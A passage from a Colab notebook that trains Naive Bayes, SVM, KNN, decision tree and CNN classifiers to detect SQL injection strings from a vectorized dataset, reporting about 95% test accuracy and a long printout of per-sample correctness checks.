              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "      <script>\n",
              "        const buttonEl =\n",
              "          document.querySelector('#df-19698e7f-4b3d-4977-9702-f8e5d823e4b6 button.colab-df-convert');\n",
              "        buttonEl.style.display =\n",
              "          google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "        async function convertToInteractive(key) {\n",
              "          const element = document.querySelector('#df-19698e7f-4b3d-4977-9702-f8e5d823e4b6');\n",
              "          const dataTable =\n",
              "            await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                     [key], {});\n",
              "          if (!dataTable) return;\n",
              "\n",
              "          const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "            '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "            + ' to learn more about interactive tables.';\n",
              "          element.innerHTML = '';\n",
              "          dataTable['output_type'] = 'display_data';\n",
              "          await google.colab.output.renderOutput(dataTable, element);\n",
              "          const docLink = document.createElement('div');\n",
              "          docLink.innerHTML = docLinkHtml;\n",
              "          element.appendChild(docLink);\n",
              "        }\n",
              "      </script>\n",
              "    </div>\n",
              "  </div>\n",
              "  "
            ]
          },
          "metadata": {},
          "execution_count": 196
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "df.to_csv('sqli.csv', index=False, encoding='utf-16')"
      ],
      "metadata": {
        "id": "pZDOEGf7bCeq"
      },
      "execution_count": 197,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "df=pd.read_csv('sqli.csv',encoding='utf-16')"
      ],
      "metadata": {
        "id": "R_GnA4-nbEmb"
      },
      "execution_count": 198,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# vectorization of data\n",
        "\n",
        "from sklearn.feature_extraction.text import CountVectorizer\n",
        "vectorizer = CountVectorizer( min_df=2, max_df=0.7, max_features=4096, stop_words=stopwords.words('english'))\n",
        "posts = vectorizer.fit_transform(df['Sentence'].values.astype('U')).toarray()"
      ],
      "metadata": {
        "id": "LPryOfHPbGWN"
      },
      "execution_count": 199,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "posts.shape"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "O-EuuHW3bHzF",
        "outputId": "8cd0c057-7f30-4213-de0a-96793197aa1c"
      },
      "execution_count": 200,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(5604, 4096)"
            ]
          },
          "metadata": {},
          "execution_count": 200
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "posts.shape=(5604,64,64,1)"
      ],
      "metadata": {
        "id": "Klp3VW2_bJGK"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "posts.shape"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "SDyR4x99b4_9",
        "outputId": "c18d23bf-d606-473f-accf-6b5fc3c623c5"
      },
      "execution_count": 206,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(5604, 64, 64, 1)"
            ]
          },
          "metadata": {},
          "execution_count": 206
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "X=posts"
      ],
      "metadata": {
        "id": "tYyCcZPpb6uQ"
      },
      "execution_count": 207,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "y=df['Label']"
      ],
      "metadata": {
        "id": "syVMgb2Ab7t4"
      },
      "execution_count": 208,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.model_selection import train_test_split"
      ],
      "metadata": {
        "id": "FEQusYvpb88T"
      },
      "execution_count": 209,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# split train test data\n",
        "\n",
        "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)"
      ],
      "metadata": {
        "id": "z0Ac-muwb-LT"
      },
      "execution_count": 210,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "trainX=X_train.copy()\n",
        "trainX.shape=(X_train.shape[0],trainX.shape[1]*trainX.shape[2])\n",
        "testX=X_test.copy()\n",
        "testX.shape=(testX.shape[0],testX.shape[1]*testX.shape[2])"
      ],
      "metadata": {
        "id": "QU6DPP2yb_j4"
      },
      "execution_count": 211,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.naive_bayes import GaussianNB\n",
        "\n",
        "gnb = GaussianNB()\n",
        "\n",
        "gnb.fit(trainX, y_train)\n",
        "\n",
        "pred_gnb = gnb.predict(testX)"
      ],
      "metadata": {
        "id": "pc8Hn1MRcA4T"
      },
      "execution_count": 212,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# SVM\n",
        "from sklearn.svm import SVC\n",
        "clf = SVC(gamma='auto')\n",
        "clf.fit(trainX, y_train)\n",
        "pred_svm=clf.predict(testX)"
      ],
      "metadata": {
        "id": "LRy2rb4ucEHq"
      },
      "execution_count": 213,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.neighbors import KNeighborsClassifier\n",
        "\n",
        "neigh = KNeighborsClassifier(n_neighbors=3)\n",
        "neigh.fit(trainX, y_train)\n",
        "\n",
        "pred_knn = neigh.predict(testX)"
      ],
      "metadata": {
        "id": "Rw9ASgazcGPD"
      },
      "execution_count": 214,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn import tree\n",
        "\n",
        "dt = tree.DecisionTreeClassifier()\n",
        "dt = dt.fit(trainX, y_train)\n",
        "\n",
        "pred_dt = dt.predict(testX)"
      ],
      "metadata": {
        "id": "yOGoxUkZcG6S"
      },
      "execution_count": 215,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "X_train.shape"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "YISvTyRccJCr",
        "outputId": "db349f10-0645-47ff-fbf1-ab5022f0dfe3"
      },
      "execution_count": 216,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(4483, 64, 64, 1)"
            ]
          },
          "metadata": {},
          "execution_count": 216
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import tensorflow as tf\n",
        "from keras.models import Sequential\n",
        "from keras import layers\n",
        "from keras.preprocessing.text import Tokenizer\n",
        "from keras.wrappers.scikit_learn import KerasClassifier"
      ],
      "metadata": {
        "id": "cI_bLt0xcKdr"
      },
      "execution_count": 217,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "model=tf.keras.models.Sequential([\n",
        "    \n",
        "    tf.keras.layers.Conv2D(64, (3,3), activation=tf.nn.relu, input_shape=(64,64,1)),\n",
        "    tf.keras.layers.MaxPooling2D(2,2),\n",
        "    \n",
        "    tf.keras.layers.Conv2D(128,(3,3), activation=tf.nn.relu),\n",
        "    tf.keras.layers.MaxPooling2D(2,2),\n",
        "    \n",
        "    tf.keras.layers.Conv2D(256,(3,3), activation='relu'),\n",
        "    tf.keras.layers.MaxPooling2D(2,2),\n",
        "    \n",
        "    tf.keras.layers.Flatten(),\n",
        "    tf.keras.layers.Dense(256, activation='relu'),\n",
        "    tf.keras.layers.Dense(128,activation='relu'),\n",
        "    tf.keras.layers.Dense(64, activation=tf.nn.relu),\n",
        "    tf.keras.layers.Dense(1, activation='sigmoid')\n",
        "])"
      ],
      "metadata": {
        "id": "dIPsSzdjcLso"
      },
      "execution_count": 218,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "model.compile(loss='binary_crossentropy', \n",
        "              optimizer='adam', \n",
        "              metrics=['accuracy'])\n",
        "model.summary()"
      ],
      "metadata": {
        "id": "ecy1i64hcM4T"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "classifier_nn = model.fit(X_train,y_train,\n",
        "                    epochs=10,\n",
        "                    verbose=True,\n",
        "                    validation_data=(X_test, y_test),\n",
        "                    batch_size=128)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sZP1SLRlcO5z",
        "outputId": "dc271660-81de-45f1-af0f-75f14c66b26b"
      },
      "execution_count": 221,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Epoch 1/10\n",
            "36/36 [==============================] - 99s 3s/step - loss: 0.3121 - accuracy: 0.8387 - val_loss: 0.2291 - val_accuracy: 0.8742\n",
            "Epoch 2/10\n",
            "36/36 [==============================] - 91s 3s/step - loss: 0.1817 - accuracy: 0.9052 - val_loss: 0.2023 - val_accuracy: 0.9144\n",
            "Epoch 3/10\n",
            "36/36 [==============================] - 96s 3s/step - loss: 0.1567 - accuracy: 0.9233 - val_loss: 0.1614 - val_accuracy: 0.9286\n",
            "Epoch 4/10\n",
            "36/36 [==============================] - 97s 3s/step - loss: 0.1380 - accuracy: 0.9311 - val_loss: 0.1603 - val_accuracy: 0.9197\n",
            "Epoch 5/10\n",
            "36/36 [==============================] - 94s 3s/step - loss: 0.1181 - accuracy: 0.9387 - val_loss: 0.1997 - val_accuracy: 0.9295\n",
            "Epoch 6/10\n",
            "36/36 [==============================] - 92s 3s/step - loss: 0.1085 - accuracy: 0.9424 - val_loss: 0.2259 - val_accuracy: 0.9269\n",
            "Epoch 7/10\n",
            "36/36 [==============================] - 90s 3s/step - loss: 0.1029 - accuracy: 0.9458 - val_loss: 0.1374 - val_accuracy: 0.9456\n",
            "Epoch 8/10\n",
            "36/36 [==============================] - 90s 3s/step - loss: 0.0894 - accuracy: 0.9485 - val_loss: 0.1390 - val_accuracy: 0.9483\n",
            "Epoch 9/10\n",
            "36/36 [==============================] - 92s 3s/step - loss: 0.0832 - accuracy: 0.9538 - val_loss: 0.1506 - val_accuracy: 0.9465\n",
            "Epoch 10/10\n",
            "36/36 [==============================] - 96s 3s/step - loss: 0.0806 - accuracy: 0.9554 - val_loss: 0.1567 - val_accuracy: 0.9474\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "pred=model.predict(X_test)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "fEljKTWRcQH1",
        "outputId": "e1b3f897-e44d-4b21-9f0d-c05db8748644"
      },
      "execution_count": 222,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "36/36 [==============================] - 5s 144ms/step\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "for i in range(len(pred)):\n",
        "    if pred[i]>0.5:\n",
        "        pred[i]=1\n",
        "    elif pred[i]<=0.5:\n",
        "        pred[i]=0"
      ],
      "metadata": {
        "id": "H39undJecRQt"
      },
      "execution_count": 223,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from sklearn.metrics import accuracy_score"
      ],
      "metadata": {
        "id": "KI4nzkkqcSMr"
      },
      "execution_count": 224,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "accuracy_score(y_test,pred)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Hcr9AagucTFj",
        "outputId": "e5acd4cf-42dc-4271-e894-07788f51e6b8"
      },
      "execution_count": 225,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0.9473684210526315"
            ]
          },
          "metadata": {},
          "execution_count": 225
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "for i,j in zip(y_test,pred):\n",
        "    print(i==j)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ddU7aUy4cUCc",
        "outputId": "dc3a25d8-6673-41bc-878e-9916c0fb8530"
      },
      "execution_count": 226,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[ True]\n",
            "[False]\n",
            "[ True]\n",
